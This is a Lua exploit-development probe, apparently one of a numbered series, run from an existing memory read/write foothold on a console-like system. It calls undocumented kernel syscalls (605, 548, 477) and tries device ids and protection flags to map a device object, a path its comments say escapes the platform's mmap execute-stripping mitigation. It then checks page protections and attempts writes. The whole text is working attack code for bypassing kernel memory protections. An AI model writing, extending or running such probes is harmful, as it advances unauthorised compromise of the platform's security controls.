-- CRASH_CLASS: HIGH
-- PROBE 863a: 605 DEVICE ID -> HANDLE -> 548 OP 0 MAP
--
-- Finding 107: 548 op 0 builds {entry+0, entry+0x10, prot, arg2, -1, entry+8}
-- and 0xabd540 validates [0] as a handle < 0x4000 before mapping through
-- 0x3c33e0(handle, [proc+8]). 559a showed 605 accepts the device id
-- 0x19810000.  If 605 hands back a handle in that range, op 0 can map the
-- device object, and a device mapping is the one thing the generic mmap
-- X-strip never touches (837a/838a).

print("=== PROBE 863a: 605 -> 548 op 0 ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function U(a)
    a = to_num(a)
    return uint64(string.format("0x%08X%08X",
        math.floor(a / 4294967296), a % 4294967296))
end
local function hex(v)
    local n = to_num(v)
    if n < 0 then n = n + 18446744073709551616 end
    return string.format("%016X", n)
end
local function d(p, i) return to_num(memory.read_dword(p + i * 4)) end

local sc605 = make_syscall(605)
local sc548 = make_syscall(548)
local sc477 = make_syscall(477)
local sc674 = make_syscall(674)
local sc549 = make_syscall(549)
local sc550 = make_syscall(550)

local entry = to_num(memory.alloc(0x60))
local regs = to_num(memory.alloc(0x1000))
local cntp = to_num(memory.alloc(0x40))

local function zero(p, n)
    for i = 0, n - 1, 8 do memory.write_qword(p + i, 0) end
end

local function num(fn)
    local ok, rv = pcall(fn)
    if not ok then return nil end
    return to_num(rv)
end

local function prot_of(target)
    zero(cntp, 0x40)
    local ok = pcall(function()
        sc674(U(regs), U(72), U(128), U(cntp), U(0x40000000))
    end)
    if not ok then return nil end
    local n = to_num(memory.read_dword(cntp))
    if n <= 0 or n > 128 then return nil end
    local lo = target % 4294967296
    local hi = math.floor(target / 4294967296)
    for k = 0, n - 1 do
        local b = regs + k * 72
        if d(b, 0) == lo and d(b, 1) == hi then
            return d(b, 6)
        end
    end
    return nil
end

local function call548(addr, len, prot, op)
    zero(entry, 0x60)
    memory.write_qword(entry, U(addr))
    memory.write_qword(entry + 8, 0)
    memory.write_qword(entry + 0x10, U(len))
    memory.write_byte(entry + 0x18, prot)
    memory.write_dword(entry + 0x1C, op)
    return num(function()
        return sc548(U(0), U(0), U(entry), U(1), U(0))
    end)
end

print(string.format("[0] pid=%s", tostring(make_syscall(20)())))
print("")

print("[A] 605(id)")
local found = {}
for _, id in ipairs({0x19810000, 0x19810001, 0x1981000, 0x198100, 0x1981,
                     0x19820000, 0x1002, 1, 0}) do
    local rv = num(function() return sc605(U(id)) end)
    print(string.format("[A] 605(%08X) -> %s", id,
        rv == nil and "PCALLFAIL" or hex(rv)))
    if rv and rv ~= 0 then found[#found + 1] = {id, rv} end
end
print(string.format("[A] %d non-zero", #found))
print("")

if #found == 0 then
    print("[B] no handle from 605; trying 548 op 0 with the device id itself")
    for _, id in ipairs({0x19810000}) do
        for _, prot in ipairs({1, 3, 5}) do
            local rv = call548(id, 0x4000, prot, 0)
            print(string.format("[B] op0 handle=%08X prot=%d -> %s",
                id, prot, rv == nil and "PCALLFAIL" or hex(rv)))
        end
    end
else
    for _, e in ipairs(found) do
        local id, handle = e[1], e[2]
        print(string.format("[B] id=%08X -> %s", id, hex(handle)))
        if handle < 0x10000 then
            for _, prot in ipairs({1, 3, 5}) do
                local rv = call548(handle, 0x4000, prot, 0)
                local line = string.format("[B] op0 handle=%s len=4000 prot=%d -> %s",
                    tostring(handle), prot, rv == nil and "PCALLFAIL" or hex(rv))
                if rv and rv > 0x1000 and rv < 0x8000000000 then
                    line = line .. string.format(" realprot=%s",
                        tostring(prot_of(rv) or "?"))
                    local okw = pcall(function() memory.write_dword(rv, 0x41424344) end)
                    line = line .. " write=" .. tostring(okw)
                end
                print(line)
            end
            local m = num(function()
                return sc477(U(0), U(0x4000), U(7), U(0x1002), U(handle), U(0))
            end)
            print(string.format("[B] mmap(fd=%s) -> %s", tostring(handle),
                m == nil and "PCALLFAIL" or hex(m)))
        end
    end
end
print("")

-- control: a normal anonymous page through the same op 0 path must still work
local anon = num(function()
    return sc477(U(0), U(0x4000), U(3), U(0x1002), U(-1), U(0))
end)
print(string.format("[C] control mmap anon -> %s", anon == nil and "FAIL" or hex(anon)))

local function name_page(tag)
    local p = to_num(memory.alloc(0x40))
    for i = 0, 0x3F do memory.write_byte(p + i, 0) end
    local t = "h863a" .. tag
    for i = 1, #t do memory.write_byte(p + i - 1, string.byte(t, i)) end
    return p
end
local okc, id = pcall(function() return sc549(U(name_page("a")), U(1), U(0), U(0x100)) end)
local okd, rvd = pcall(function() return sc550(U(to_num(id))) end)
print(string.format("[Z] create=%s destroy=%s alive=true",
    okc and hex(id) or "FAIL", okd and hex(rvd) or "FAIL"))
print("=== PROBE 863a COMPLETE ===")
